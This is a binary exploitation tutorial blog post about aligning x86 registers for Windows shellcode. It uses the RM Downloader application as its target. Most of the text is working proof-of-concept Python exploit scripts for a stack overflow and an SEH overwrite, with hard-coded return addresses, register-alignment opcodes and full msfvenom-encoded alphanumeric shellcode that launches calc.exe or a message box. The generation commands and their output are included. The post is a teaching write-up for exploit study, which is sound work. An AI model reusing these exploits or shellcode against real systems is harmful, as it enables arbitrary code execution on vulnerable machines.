---
title: Alignments on Windows Registers
author: fwinsnes
date: 2021-02-01 13:44:00 +0800
categories: [Binary Exploitation]
tags: [assembly, shellcoding, vulnerability]
---

# Preamble

Welcome once again to my website! Within this post, i will be introducing methods to align x86 registers on Windows, topic that was hard for me to find when starting regarding Binary Exploitation.

Also, i would like to say that if by any means you find an error within this post, please let me know! I am still a beginner.

## Small requirements

Despite the fact that these techniques do not require much knowledge, having beginner/intermediate experience with Assembly may help.

# Explanation of the concept

The definition of the word "alignment" is "arrangement in a straight line or in correct relative positions.", meaning that, when applied 
to CPU registers, it would refer to having two or more variables with the same value. 

# Why aligning registers?

In order to execute shellcode within a stack, the payload will have to work directly with a register pointing to its address. For example, msfvenom always includes 6 additional bytes within all generated payloads, whose function is to align a register, so the rest can work with such. However, not all softwares may accept such characters, issue which brings us to this post!

## The application

In order to perform this technique practically, i will use as an example the RM Downloader application, which i made a post about [here](https://whitecr0wz.github.io/posts/RM-Downloader-SEH/).

I would like to remark that i won't be explaining the usual steps to perform a Stack Buffer Overflow/SEH Overwrite, as i have done such in previous posts/findings. Instead, i will be focusing the technique regarding alignments. I strongly recommend to follow the [post](https://whitecr0wz.github.io/posts/RM-Downloader-SEH/) regarding the application, so that in case you would like to replicate what was shown here won't be a hassle.

# Stack Overflows

To begin with an easy practice, it will be shown how a JMP/CALL/PUSH ESP instruction does everything that was done previously, by overwriting the EIP value, as it automatically aligns the ESP value with the previous one, doing the entire work for us!

Current poc:

```term
import struct 

pushesp = struct.pack("<I", 0x1003DF53) #   0x1003df53 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, 
SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\RM Downloader\RDfilter03.dll)

buffer = "A" * 8704 + pushesp + "\xff" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

Once the script is run and the explotation process is completed, the debugger greets us with the following result:

![](/assets/img/Alignments/1.png)

It is important to note the values of the ESP and EIP registers, as they have been aligned by the PUSH ESP instruction.

The next step would usually be parsing some nops and introducing our shellcode. However, there is an alternative way to execute shellcode, as the ESP pointer has already been aligned to the EIP, it is possible to generate shellcode that directly works with the ESP pointer, instead of aligning the registers again. Moreover, the introduction of other bytes that are not related with the shellcode (such as a nop, or anything else), will dealign the ESP register.

The sent payload changes from: 

offset + ret + nops + shellcode 

To:

offset + ret + shellcode

In order to perform this, the flag "BufferRegister=REG32" shall be used with msfvenom. Additionally, the shellcode should be generated with alphanumeric bytes, as it will become a completely alphanumeric shellcode instead of the regular one, whose first 6 bytes will always be non-alphanumeric, this done so that the shellcode does not cause any issue.

The shellcode is generated:

```term
root@whitecr0wz:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread BufferRegister=ESP 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 440 (iteration=0)
x86/alpha_mixed chosen with final size 440
Payload size: 440 bytes
Final size of py file: 2145 bytes
buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x79\x6c\x48\x68\x6f\x72\x47\x70\x43\x30\x67\x70\x75"
buf += b"\x30\x4e\x69\x48\x65\x55\x61\x59\x50\x51\x74\x4e\x6b"
buf += b"\x32\x70\x64\x70\x4c\x4b\x73\x62\x36\x6c\x6e\x6b\x70"
buf += b"\x52\x76\x74\x6e\x6b\x44\x32\x51\x38\x74\x4f\x4e\x57"
buf += b"\x61\x5a\x65\x76\x76\x51\x49\x6f\x4c\x6c\x67\x4c\x35"
buf += b"\x31\x51\x6c\x47\x72\x34\x6c\x45\x70\x4b\x71\x78\x4f"
buf += b"\x44\x4d\x57\x71\x4b\x77\x49\x72\x39\x62\x42\x72\x53"
buf += b"\x67\x6e\x6b\x70\x52\x62\x30\x6e\x6b\x53\x7a\x45\x6c"
buf += b"\x4e\x6b\x52\x6c\x72\x31\x30\x78\x78\x63\x52\x68\x77"
buf += b"\x71\x58\x51\x50\x51\x4c\x4b\x66\x39\x61\x30\x47\x71"
buf += b"\x7a\x73\x6c\x4b\x77\x39\x47\x68\x5a\x43\x66\x5a\x51"
buf += b"\x59\x4e\x6b\x47\x44\x6c\x4b\x66\x61\x39\x46\x65\x61"
buf += b"\x69\x6f\x6c\x6c\x7a\x61\x7a\x6f\x44\x4d\x46\x61\x6a"
buf += b"\x67\x36\x58\x79\x70\x63\x45\x49\x66\x65\x53\x53\x4d"
buf += b"\x4c\x38\x37\x4b\x53\x4d\x71\x34\x51\x65\x59\x74\x51"
buf += b"\x48\x6c\x4b\x53\x68\x67\x54\x45\x51\x6e\x33\x72\x46"
buf += b"\x6e\x6b\x36\x6c\x72\x6b\x4c\x4b\x63\x68\x45\x4c\x45"
buf += b"\x51\x6b\x63\x4c\x4b\x55\x54\x6c\x4b\x37\x71\x78\x50"
buf += b"\x6e\x69\x50\x44\x55\x74\x75\x74\x73\x6b\x61\x4b\x45"
buf += b"\x31\x63\x69\x53\x6a\x63\x61\x6b\x4f\x6d\x30\x71\x4f"
buf += b"\x53\x6f\x52\x7a\x4e\x6b\x46\x72\x38\x6b\x4c\x4d\x73"
buf += b"\x6d\x62\x4a\x73\x31\x4c\x4d\x6f\x75\x58\x32\x57\x70"
buf += b"\x65\x50\x65\x50\x50\x50\x50\x68\x64\x71\x6e\x6b\x42"
buf += b"\x4f\x4f\x77\x69\x6f\x6a\x75\x4d\x6b\x59\x70\x65\x4d"
buf += b"\x55\x7a\x75\x5a\x75\x38\x6e\x46\x6d\x45\x4d\x6d\x4f"
buf += b"\x6d\x69\x6f\x38\x55\x47\x4c\x65\x56\x33\x4c\x55\x5a"
buf += b"\x6b\x30\x6b\x4b\x59\x70\x54\x35\x73\x35\x4f\x4b\x72"
buf += b"\x67\x37\x63\x50\x72\x30\x6f\x70\x6a\x65\x50\x66\x33"
buf += b"\x49\x6f\x6e\x35\x72\x43\x35\x31\x70\x6c\x33\x53\x64"
buf += b"\x6e\x71\x75\x34\x38\x71\x75\x77\x70\x41\x41"
root@whitecr0wz:~# 
```

Final poc:

```term
import struct 

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread BufferRegister=ESP 
# Payload size: 440 bytes

buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x79\x6c\x48\x68\x6f\x72\x47\x70\x43\x30\x67\x70\x75"
buf += b"\x30\x4e\x69\x48\x65\x55\x61\x59\x50\x51\x74\x4e\x6b"
buf += b"\x32\x70\x64\x70\x4c\x4b\x73\x62\x36\x6c\x6e\x6b\x70"
buf += b"\x52\x76\x74\x6e\x6b\x44\x32\x51\x38\x74\x4f\x4e\x57"
buf += b"\x61\x5a\x65\x76\x76\x51\x49\x6f\x4c\x6c\x67\x4c\x35"
buf += b"\x31\x51\x6c\x47\x72\x34\x6c\x45\x70\x4b\x71\x78\x4f"
buf += b"\x44\x4d\x57\x71\x4b\x77\x49\x72\x39\x62\x42\x72\x53"
buf += b"\x67\x6e\x6b\x70\x52\x62\x30\x6e\x6b\x53\x7a\x45\x6c"
buf += b"\x4e\x6b\x52\x6c\x72\x31\x30\x78\x78\x63\x52\x68\x77"
buf += b"\x71\x58\x51\x50\x51\x4c\x4b\x66\x39\x61\x30\x47\x71"
buf += b"\x7a\x73\x6c\x4b\x77\x39\x47\x68\x5a\x43\x66\x5a\x51"
buf += b"\x59\x4e\x6b\x47\x44\x6c\x4b\x66\x61\x39\x46\x65\x61"
buf += b"\x69\x6f\x6c\x6c\x7a\x61\x7a\x6f\x44\x4d\x46\x61\x6a"
buf += b"\x67\x36\x58\x79\x70\x63\x45\x49\x66\x65\x53\x53\x4d"
buf += b"\x4c\x38\x37\x4b\x53\x4d\x71\x34\x51\x65\x59\x74\x51"
buf += b"\x48\x6c\x4b\x53\x68\x67\x54\x45\x51\x6e\x33\x72\x46"
buf += b"\x6e\x6b\x36\x6c\x72\x6b\x4c\x4b\x63\x68\x45\x4c\x45"
buf += b"\x51\x6b\x63\x4c\x4b\x55\x54\x6c\x4b\x37\x71\x78\x50"
buf += b"\x6e\x69\x50\x44\x55\x74\x75\x74\x73\x6b\x61\x4b\x45"
buf += b"\x31\x63\x69\x53\x6a\x63\x61\x6b\x4f\x6d\x30\x71\x4f"
buf += b"\x53\x6f\x52\x7a\x4e\x6b\x46\x72\x38\x6b\x4c\x4d\x73"
buf += b"\x6d\x62\x4a\x73\x31\x4c\x4d\x6f\x75\x58\x32\x57\x70"
buf += b"\x65\x50\x65\x50\x50\x50\x50\x68\x64\x71\x6e\x6b\x42"
buf += b"\x4f\x4f\x77\x69\x6f\x6a\x75\x4d\x6b\x59\x70\x65\x4d"
buf += b"\x55\x7a\x75\x5a\x75\x38\x6e\x46\x6d\x45\x4d\x6d\x4f"
buf += b"\x6d\x69\x6f\x38\x55\x47\x4c\x65\x56\x33\x4c\x55\x5a"
buf += b"\x6b\x30\x6b\x4b\x59\x70\x54\x35\x73\x35\x4f\x4b\x72"
buf += b"\x67\x37\x63\x50\x72\x30\x6f\x70\x6a\x65\x50\x66\x33"
buf += b"\x49\x6f\x6e\x35\x72\x43\x35\x31\x70\x6c\x33\x53\x64"
buf += b"\x6e\x71\x75\x34\x38\x71\x75\x77\x70\x41\x41"

pushesp = struct.pack("<I", 0x1003DF53) #   0x1003df53 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, 
SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\RM Downloader\RDfilter03.dll)

buffer = "A" * 8704 + pushesp + buf + "\xff" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

## Results

![](/assets/img/Alignments/2.png)

# SEH Overwrites

As the Stack Overflows section has already been covered, it will now be proceeded to explain how alignments are performed within this scenario, which can be a little more complex, as the registers are not aligned by default.

In order to perform the experiment, the same application will be used.

Current poc:

```term
import struct 

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10031779)

buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 5 + "\xff" * 200
f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

Once the exploit is run, the payload is pasted and loaded, the debugger shows an interesting reaction:

![](/assets/img/Alignments/3.png)

Checking the registers, none of them have the exact value, nor similar. Usually, when performing alignments in SEH Overwrites, the EAX register tends to be used, as it normally requires friendly characters, and is a non-volatile pointer as well. 

In order to perform the calculations as intended, it must be zeroed. The best way to do this, would be to copy the value of EDI, which is zero, to EAX. The instructions required for this operations would be PUSH EDI, POP EAX.

Getting the opcodes for the operation with msf-nasm_shell:

```term
nasm > PUSH EDI
00000000  57                push edi
nasm > POP EAX
00000000  58                pop eax
nasm > 
```

Once this is done, it is posible to proceed with the calculations.

There are plenty of methods to align a register. However, a good one to start with would be copying the value of ESP to EAX. Furthermore, the address you desire EAX to be aligned is substracted to such register.

Getting the opcodes for copying ESP to EAX.

```term
nasm > PUSH ESP
00000000  54                push esp
nasm > POP EAX
00000000  58                pop eax
nasm > 
```

After the 4 bytes are positioned after the padding, the debugger reacts as intended:

![](/assets/img/Alignments/4.png)

Note that ESP and EAX contain the same values.

Once this is done, the next step would be to calculate the distance between a desired address, being on this case 0x000E2560, and the EAX value, which is 0x000E1EE4.

In order to perform the calculation, the Windows calculator will be used:

![](/assets/img/Alignments/5.png)

As seen, the value given by the calculator is 67C. In order to align the EAX value as intended, the 16-bits of the register will be modified (ax), adding the given value, so it lands to the address that was chosen:

```term
nasm > add ax, 0x67c 
00000000  66057C06          add ax,0x67c
nasm > 
```

With this last step, the alignment part finishes!

Current poc:

```term
import struct 

alignment = "\x57\x58\x54\x58" # PUSH EDI, POP EAX / PUSH ESP, POP EAX
alignment += "\x66\x05\x7C\x06" # add ax, 0x67c

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10031779)

buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 5 + alignment + "\xff" * 200
f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

After repeating the explotation process, Immunity reveals that the alignment was processed successfully:

![](/assets/img/Alignments/6.png)

However, the EIP register does not match EAX:

![](/assets/img/Alignments/7.png)

Nonetheless, this matter has an easy solution, just parsing some small padding until the EIP reaches the same address as EAX should be enough. Furthermore, this won't affect EAX, as it is a non-volatile register.

Current poc:

```term
import struct 

alignment = "\x57\x58\x54\x58" # PUSH EDI, POP EAX / PUSH ESP, POP EAX
alignment += "\x66\x05\x7C\x06" # add ax, 0x67c

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10031779)

buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 5 + alignment + "\x41\x49" * 11 + "\xff" * 200
f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```
After repeating the process, EIP and EAX seem to be aligned:

![](/assets/img/Alignments/8.png)

# Finally, shellcode

Repeating as the previous section, shellcode is generated with its respective flags, using EAX instead of ESP:

```term
root@whitecr0wz:~# msfvenom -p windows/messagebox TEXT='Thanks for reading the post! Until next time!' -f py -e x86/alpha_mixed EXITFUNC=thread BufferRegister=EAX 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 668 (iteration=0)
x86/alpha_mixed chosen with final size 668
Payload size: 668 bytes
Final size of py file: 3255 bytes
buf =  b""
buf += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x68\x59\x48\x6b\x6f\x6b\x59\x49\x61\x64\x54\x64\x79"
buf += b"\x64\x35\x61\x7a\x72\x4f\x42\x70\x77\x35\x61\x4f\x39"
buf += b"\x55\x34\x6c\x4b\x74\x31\x46\x50\x4c\x4b\x52\x56\x44"
buf += b"\x4c\x6c\x4b\x44\x36\x47\x6c\x6c\x4b\x32\x66\x37\x78"
buf += b"\x6c\x4b\x61\x6e\x57\x50\x4c\x4b\x47\x46\x57\x48\x72"
buf += b"\x6f\x54\x58\x34\x35\x79\x63\x73\x69\x43\x31\x4a\x71"
buf += b"\x49\x6f\x39\x71\x31\x70\x4c\x4b\x42\x4c\x75\x74\x64"
buf += b"\x64\x4e\x6b\x67\x35\x65\x6c\x4c\x4b\x33\x64\x64\x68"
buf += b"\x52\x58\x53\x31\x48\x6a\x6e\x6b\x70\x4a\x77\x68\x4c"
buf += b"\x4b\x51\x4a\x67\x50\x56\x61\x6a\x4b\x39\x73\x37\x44"
buf += b"\x57\x39\x4e\x6b\x64\x74\x6c\x4b\x57\x71\x48\x6e\x35"
buf += b"\x61\x6b\x4f\x65\x61\x79\x50\x49\x6c\x6c\x6c\x4c\x44"
buf += b"\x39\x50\x53\x44\x45\x57\x4a\x61\x78\x4f\x44\x4d\x33"
buf += b"\x31\x79\x57\x4a\x4b\x69\x64\x77\x4b\x33\x4c\x64\x64"
buf += b"\x54\x68\x64\x35\x58\x61\x4e\x6b\x71\x4a\x47\x54\x57"
buf += b"\x71\x68\x6b\x53\x56\x4e\x6b\x76\x6c\x70\x4b\x4e\x6b"
buf += b"\x52\x7a\x75\x4c\x33\x31\x48\x6b\x4c\x4b\x65\x54\x6c"
buf += b"\x4b\x45\x51\x69\x78\x4e\x69\x37\x34\x35\x74\x47\x6c"
buf += b"\x43\x51\x48\x43\x6c\x72\x63\x38\x75\x79\x48\x54\x6c"
buf += b"\x49\x4d\x35\x6c\x49\x79\x52\x73\x58\x6c\x4e\x62\x6e"
buf += b"\x64\x4e\x6a\x4c\x51\x42\x58\x68\x6f\x6f\x79\x6f\x39"
buf += b"\x6f\x49\x6f\x6d\x59\x37\x35\x73\x34\x4f\x4b\x7a\x4f"
buf += b"\x68\x4e\x79\x70\x53\x50\x4d\x57\x75\x4c\x55\x74\x46"
buf += b"\x32\x7a\x48\x4e\x6e\x49\x6f\x6b\x4f\x4b\x4f\x4c\x49"
buf += b"\x72\x65\x43\x38\x62\x48\x42\x4c\x30\x6c\x77\x50\x73"
buf += b"\x71\x62\x48\x77\x43\x65\x62\x34\x6e\x52\x44\x55\x38"
buf += b"\x34\x35\x71\x63\x53\x55\x73\x42\x76\x50\x4b\x6b\x6f"
buf += b"\x78\x53\x6c\x67\x54\x45\x5a\x6d\x59\x78\x66\x56\x36"
buf += b"\x39\x6f\x50\x55\x54\x44\x6b\x39\x6a\x62\x46\x30\x6d"
buf += b"\x6b\x6e\x48\x4e\x42\x30\x4d\x4f\x4c\x4d\x57\x47\x6c"
buf += b"\x51\x34\x43\x62\x48\x68\x51\x4f\x39\x6f\x49\x6f\x39"
buf += b"\x6f\x71\x78\x70\x6f\x64\x38\x61\x48\x61\x30\x55\x38"
buf += b"\x43\x51\x50\x67\x52\x45\x62\x62\x61\x78\x32\x6d\x53"
buf += b"\x55\x71\x63\x34\x33\x54\x71\x4b\x6b\x6d\x58\x53\x6c"
buf += b"\x34\x64\x65\x5a\x4c\x49\x5a\x43\x65\x38\x65\x71\x56"
buf += b"\x38\x67\x50\x77\x50\x43\x58\x54\x34\x42\x49\x42\x4d"
buf += b"\x75\x35\x55\x38\x61\x75\x32\x58\x51\x64\x65\x70\x51"
buf += b"\x78\x31\x79\x42\x4c\x71\x30\x30\x6e\x43\x58\x31\x30"
buf += b"\x50\x55\x70\x6e\x63\x44\x55\x38\x50\x6f\x43\x43\x71"
buf += b"\x64\x54\x61\x45\x38\x73\x58\x70\x65\x77\x50\x30\x70"
buf += b"\x43\x58\x50\x6e\x31\x77\x61\x30\x70\x74\x61\x78\x35"
buf += b"\x35\x55\x31\x61\x74\x65\x39\x53\x58\x50\x6f\x71\x62"
buf += b"\x77\x50\x62\x52\x75\x38\x70\x6b\x53\x43\x75\x70\x51"
buf += b"\x76\x32\x48\x36\x34\x55\x38\x50\x61\x72\x4e\x45\x61"
buf += b"\x6a\x69\x6d\x58\x62\x6c\x74\x64\x46\x4d\x6b\x39\x49"
buf += b"\x71\x36\x51\x39\x42\x33\x62\x66\x33\x53\x61\x50\x52"
buf += b"\x6b\x4f\x48\x50\x30\x31\x6f\x30\x62\x70\x49\x6f\x42"
buf += b"\x75\x34\x48\x41\x41"
```

Final poc:

```term
import struct 

# msfvenom -p windows/messagebox TEXT='Thanks for reading the post! Until next time!' -f py -e x86/alpha_mixed EXITFUNC=thread 
BufferRegister=EAX
# Payload size: 668 bytes

buf =  b""
buf += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x68\x59\x48\x6b\x6f\x6b\x59\x49\x61\x64\x54\x64\x79"
buf += b"\x64\x35\x61\x7a\x72\x4f\x42\x70\x77\x35\x61\x4f\x39"
buf += b"\x55\x34\x6c\x4b\x74\x31\x46\x50\x4c\x4b\x52\x56\x44"
buf += b"\x4c\x6c\x4b\x44\x36\x47\x6c\x6c\x4b\x32\x66\x37\x78"
buf += b"\x6c\x4b\x61\x6e\x57\x50\x4c\x4b\x47\x46\x57\x48\x72"
buf += b"\x6f\x54\x58\x34\x35\x79\x63\x73\x69\x43\x31\x4a\x71"
buf += b"\x49\x6f\x39\x71\x31\x70\x4c\x4b\x42\x4c\x75\x74\x64"
buf += b"\x64\x4e\x6b\x67\x35\x65\x6c\x4c\x4b\x33\x64\x64\x68"
buf += b"\x52\x58\x53\x31\x48\x6a\x6e\x6b\x70\x4a\x77\x68\x4c"
buf += b"\x4b\x51\x4a\x67\x50\x56\x61\x6a\x4b\x39\x73\x37\x44"
buf += b"\x57\x39\x4e\x6b\x64\x74\x6c\x4b\x57\x71\x48\x6e\x35"
buf += b"\x61\x6b\x4f\x65\x61\x79\x50\x49\x6c\x6c\x6c\x4c\x44"
buf += b"\x39\x50\x53\x44\x45\x57\x4a\x61\x78\x4f\x44\x4d\x33"
buf += b"\x31\x79\x57\x4a\x4b\x69\x64\x77\x4b\x33\x4c\x64\x64"
buf += b"\x54\x68\x64\x35\x58\x61\x4e\x6b\x71\x4a\x47\x54\x57"
buf += b"\x71\x68\x6b\x53\x56\x4e\x6b\x76\x6c\x70\x4b\x4e\x6b"
buf += b"\x52\x7a\x75\x4c\x33\x31\x48\x6b\x4c\x4b\x65\x54\x6c"
buf += b"\x4b\x45\x51\x69\x78\x4e\x69\x37\x34\x35\x74\x47\x6c"
buf += b"\x43\x51\x48\x43\x6c\x72\x63\x38\x75\x79\x48\x54\x6c"
buf += b"\x49\x4d\x35\x6c\x49\x79\x52\x73\x58\x6c\x4e\x62\x6e"
buf += b"\x64\x4e\x6a\x4c\x51\x42\x58\x68\x6f\x6f\x79\x6f\x39"
buf += b"\x6f\x49\x6f\x6d\x59\x37\x35\x73\x34\x4f\x4b\x7a\x4f"
buf += b"\x68\x4e\x79\x70\x53\x50\x4d\x57\x75\x4c\x55\x74\x46"
buf += b"\x32\x7a\x48\x4e\x6e\x49\x6f\x6b\x4f\x4b\x4f\x4c\x49"
buf += b"\x72\x65\x43\x38\x62\x48\x42\x4c\x30\x6c\x77\x50\x73"
buf += b"\x71\x62\x48\x77\x43\x65\x62\x34\x6e\x52\x44\x55\x38"
buf += b"\x34\x35\x71\x63\x53\x55\x73\x42\x76\x50\x4b\x6b\x6f"
buf += b"\x78\x53\x6c\x67\x54\x45\x5a\x6d\x59\x78\x66\x56\x36"
buf += b"\x39\x6f\x50\x55\x54\x44\x6b\x39\x6a\x62\x46\x30\x6d"
buf += b"\x6b\x6e\x48\x4e\x42\x30\x4d\x4f\x4c\x4d\x57\x47\x6c"
buf += b"\x51\x34\x43\x62\x48\x68\x51\x4f\x39\x6f\x49\x6f\x39"
buf += b"\x6f\x71\x78\x70\x6f\x64\x38\x61\x48\x61\x30\x55\x38"
buf += b"\x43\x51\x50\x67\x52\x45\x62\x62\x61\x78\x32\x6d\x53"
buf += b"\x55\x71\x63\x34\x33\x54\x71\x4b\x6b\x6d\x58\x53\x6c"
buf += b"\x34\x64\x65\x5a\x4c\x49\x5a\x43\x65\x38\x65\x71\x56"
buf += b"\x38\x67\x50\x77\x50\x43\x58\x54\x34\x42\x49\x42\x4d"
buf += b"\x75\x35\x55\x38\x61\x75\x32\x58\x51\x64\x65\x70\x51"
buf += b"\x78\x31\x79\x42\x4c\x71\x30\x30\x6e\x43\x58\x31\x30"
buf += b"\x50\x55\x70\x6e\x63\x44\x55\x38\x50\x6f\x43\x43\x71"
buf += b"\x64\x54\x61\x45\x38\x73\x58\x70\x65\x77\x50\x30\x70"
buf += b"\x43\x58\x50\x6e\x31\x77\x61\x30\x70\x74\x61\x78\x35"
buf += b"\x35\x55\x31\x61\x74\x65\x39\x53\x58\x50\x6f\x71\x62"
buf += b"\x77\x50\x62\x52\x75\x38\x70\x6b\x53\x43\x75\x70\x51"
buf += b"\x76\x32\x48\x36\x34\x55\x38\x50\x61\x72\x4e\x45\x61"
buf += b"\x6a\x69\x6d\x58\x62\x6c\x74\x64\x46\x4d\x6b\x39\x49"
buf += b"\x71\x36\x51\x39\x42\x33\x62\x66\x33\x53\x61\x50\x52"
buf += b"\x6b\x4f\x48\x50\x30\x31\x6f\x30\x62\x70\x49\x6f\x42"
buf += b"\x75\x34\x48\x41\x41"

alignment = "\x57\x58\x54\x58" # PUSH EDI, POP EAX / PUSH ESP, POP EAX
alignment += "\x66\x05\x7C\x06" # add ax, 0x67c

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10031779)

buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 5 + alignment + "\x41\x49" * 11 + buf + "\xff" * 200
f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

# EndGame

![](/assets/img/Alignments/9.png)
